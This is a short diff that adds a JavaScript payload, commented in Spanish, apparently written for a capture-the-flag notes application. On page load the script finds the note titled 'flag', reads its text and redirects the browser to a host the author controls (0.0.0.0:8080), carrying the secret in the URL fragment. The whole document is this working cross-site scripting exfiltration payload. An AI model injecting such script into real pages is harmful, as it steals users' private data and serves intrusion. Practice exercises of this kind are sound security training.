@@ -1,0 +1,22 @@
+<script>
+window.onload = function() {
+    // Buscar todas las notas
+    var notes = document.querySelectorAll('div');
+    var flag = '';
+    
+    for (var i = 0; i < notes.length; i++) {
+        var h2 = notes[i].querySelector('h2');
+        var p = notes[i].querySelector('p');
+        
+        if (h2 && p && h2.innerText === 'flag') {
+            flag = p.innerText;
+            break;
+        }
+    }
+    
+    if (flag) {
+        // Redirigir a una URL que podamos controlar con la flag
+        window.location = 'http://0.0.0.0:8080/notes#' + flag;
+    }
+};
+</script>
